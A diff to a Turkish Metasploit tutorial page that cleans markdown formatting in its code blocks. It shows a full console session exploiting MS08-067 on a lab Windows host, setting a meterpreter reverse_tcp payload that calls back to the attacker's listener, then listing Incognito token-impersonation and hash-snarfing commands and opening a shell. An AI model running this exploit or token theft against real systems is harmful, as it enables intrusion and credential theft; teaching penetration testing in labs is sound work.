@@ -57,15 +57,15 @@ Aşağıdaki örnekte, öncelikle `ms08_067_netapi` modülü kullanılarak gerek
 
 ```bash
 msf > use exploit/windows/smb/ms08_067_netapi
-msf exploit**(**ms08_067_netapi**)** > set RHOST 10.211.55.140
-RHOST **=>** 10.211.55.140
-msf exploit**(**ms08_067_netapi**)** > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=>** windows/meterpreter/reverse_tcp
-msf exploit**(**ms08_067_netapi**)** > set LHOST 10.211.55.162
-LHOST **=>** 10.211.55.162
-msf exploit**(**ms08_067_netapi**)** > set LANG english
-LANG **=>** english
-msf exploit**(**ms08_067_netapi**)** > show targets
+msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
+RHOST => 10.211.55.140
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > set LHOST 10.211.55.162
+LHOST => 10.211.55.162
+msf exploit(ms08_067_netapi) > set LANG english
+LANG => english
+msf exploit(ms08_067_netapi) > show targets
 
 Exploit targets:
 
@@ -74,30 +74,30 @@ Exploit targets:
    0   Automatic Targeting                                
    1   Windows 2000 Universal                             
    2   Windows XP SP0/SP1 Universal                       
-   3   Windows XP SP2 English **(**NX**)**                        
-   4   Windows XP SP3 English **(**NX**)**                        
+   3   Windows XP SP2 English (NX)                        
+   4   Windows XP SP3 English (NX)                        
    5   Windows 2003 SP0 Universal                         
-   6   Windows 2003 SP1 English **(**NO NX**)**                   
-   7   Windows 2003 SP1 English **(**NX**)**                      
-   8   Windows 2003 SP2 English **(**NO NX**)**                   
-   9   Windows 2003 SP2 English **(**NX**)**                      
-   10  Windows XP SP2 Arabic **(**NX**)**                         
-   11  Windows XP SP2 Chinese - Traditional / Taiwan **(**NX**)** 
+   6   Windows 2003 SP1 English (NO NX)                   
+   7   Windows 2003 SP1 English (NX)                      
+   8   Windows 2003 SP2 English (NO NX)                   
+   9   Windows 2003 SP2 English (NX)                      
+   10  Windows XP SP2 Arabic (NX)                         
+   11  Windows XP SP2 Chinese - Traditional / Taiwan (NX) 
 
 
-msf exploit**(**ms08_067_netapi**)** > set TARGET 8
-target **=>** 8
-msf exploit**(**ms08_067_netapi**)** > exploit
+msf exploit(ms08_067_netapi) > set TARGET 8
+target => 8
+msf exploit(ms08_067_netapi) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Triggering the vulnerability...
-> Transmitting intermediate stager **for **over-sized stage...**(**191 bytes**)**
-> Sending stage **(**2650 bytes**)**
+> Transmitting intermediate stager for **over-sized stage...(191 bytes)
+> Sending stage (2650 bytes)
 > Sleeping before handling stage...
-> Uploading DLL **(**75787 bytes**)**...
+> Uploading DLL (75787 bytes)...
 > Upload completed.
-> Meterpreter session 1 opened **(**10.211.55.162:4444 -> 10.211.55.140:1028**)**
+> Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)
 
 meterpreter >
 ```
@@ -126,7 +126,7 @@ Incognito Commands
     add_user             Attempt to add a user with all tokens                   
     impersonate_token    Impersonate specified token                             
     list_tokens          List tokens available under current user context        
-    snarf_hashes         Snarf challenge/response hashes **for **every token         
+    snarf_hashes         Snarf challenge/response hashes for **every token         
 
 meterpreter >
 ```
@@ -189,7 +189,7 @@ meterpreter > shell
 Process 2804 created.
 Channel 1 created.
 Microsoft Windows XP **[**Version 5.1.2600]
-**(**C**)** Copyright 1985-2001 Microsoft Corp.
+(C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32> whoami
 whoami
